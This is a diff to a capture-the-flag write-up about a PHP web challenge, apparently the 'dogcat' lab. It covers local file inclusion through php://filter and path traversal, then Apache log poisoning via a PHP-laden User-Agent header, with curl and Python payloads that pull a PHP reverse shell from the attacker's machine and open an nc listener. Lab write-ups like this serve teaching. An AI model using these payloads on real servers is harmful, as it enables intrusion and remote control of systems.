@@ -108,7 +108,7 @@ Warning: include(somethingwithdog.php): failed to open stream: No such file or d
 Warning: include(): Failed opening 'somethingwithdog.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24
 ```
 
-So we know the page requires us to include dog (or cat) in the view-parameter of the request and then includes a file with whatever is in the view-parameter followed by ".php".
+So we know the page requires us to include dog (or cat) in the view-parameter of the request and then includes a file with whatever is in the view-parameter followed by ".php". But the file does not have to be in the same directory as the programmer had intended, maybe we can try to add a relative path to the file name.
 
 We know the website is served using apache 2.4.38 (from opening /server-status and running nmap) so we could have a look at well known apache files e.g. the log files. Just to be safe, fell free to add as many ../ as you want :D
 
@@ -123,7 +123,7 @@ This fails with the same error as above. So it seems we can only view ".php" fil
 Based on how we can manipulate the view paramenter, this page may be vulnerable to [Local File Inclusion](https://blog.sqreen.com/local-file-inclusions-explained/).
 
 With 'php://filter/convert.base64-encode/resource=' we can convert the given resource to base64
-With './cat/../index' we add they keyword cat and move back to the main web folder and chose index.php
+With './cat/../index' we add they keyword cat and move back to the main web folder and choose index.php
 
 ```html
 ?view=php://filter/convert.base64-encode/resource=./cat/../index
@@ -177,7 +177,7 @@ Now lets try looking at the apache2 access.log files again (this time with the "
 ?view=./cat/../../../../../../../../var/log/apache2/access&ext=.log
 ```
 
-Sucecss! We can see the logs (our visits). The logs basically contain the URL request including parameters and the user-agent.
+Success! We can see the logs (our visits). The logs basically contain the URL request including parameters and the user-agent.
 
 If you feel lucky, you could've guessed that there is a flag.php in the main folder of the website and try view this by misusing the view? parameter as follows:
 
@@ -195,7 +195,7 @@ echo "PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2d=" | base64 --decod
 
 However, this was a lucky guess... maybe there is another way to get there...
 
-We can try to inject PHP code to the access.log and trigger the code by visiting the page. Let's try running a request e.g.:
+We can try to inject PHP code to the access.log and trigger the code by visiting the page. Remember from above, there are two things we can manipulate at request time that are written to the logs, the URL request including parameters and the user-agent. Let's try running a request e.g.:
 
 ```html
 ?view=./cat/../../<?php echo "HI!";?>
@@ -204,7 +204,7 @@ We can try to inject PHP code to the access.log and trigger the code by visiting
 Unfortunantly this fails as e.g. all spaces are URL encoded. However, there are clear spaces visible in the user-agent. Let's try to change the user-agent string:
 
 ```sh
-curl -A "<?php echo "HI!";?>" http://10.10.209.48
+curl -A "<?php echo "HI!";?>" http://10.10.46.238
 ```
 
 Success! The user-agent string can be used to inject PHP code. Let's use this to download a php reverse shell.
@@ -213,7 +213,7 @@ Success! The user-agent string can be used to inject PHP code. Let's use this to
 
 Kali comes with some reverse shells e.g. [php-reverse-shell](http://pentestmonkey.net/tools/php-reverse-shell) "/usr/share/webshells/php/php-reverse-shell.php".
 
-Let's create a copy of this file and modify the two input fields marked with "// CHANGE THIS"
+Let's create a copy of this file and modify the two input fields marked with "// CHANGE THIS". The IP address to put here belongs to our kali machine.
 
 ```config
 $ip = '10.9.182.239';  // CHANGE THIS
@@ -235,14 +235,14 @@ nc -lvnp 9999
 Now let's run a GET request with a custom user-agent that includes PHP to get the reverse-shell
 
 ```sh
-curl -A "<?php file_put_contents('shell.php',file_get_contents('http://10.9.182.239:9090/shell.php')); ?>" http://10.10.209.48
+curl -A "<?php file_put_contents('shell.php',file_get_contents('http://10.9.182.239:9090/shell.php')); ?>" http://10.10.46.238
 ```
 
 Alternatively we could use any other tool to send a GET request with custom user-agent string. E.g. burp-suite or write a python script like so:
 
 ```py
 import requests
-print (requests.get('http://10.9.182.239/?view=cat', headers={'User-Agent': '<?php file_put_contents("shell.php",file_get_contents("http://10.9.182.239:9090/shell.php")); ?>',}).text)
+print (requests.get('http://10.10.46.238/?view=cat', headers={'User-Agent': '<?php file_put_contents("shell.php",file_get_contents("http://10.9.182.239:9090/shell.php")); ?>',}).text)
 ```
 
 Use the previous technique to include the access log again:
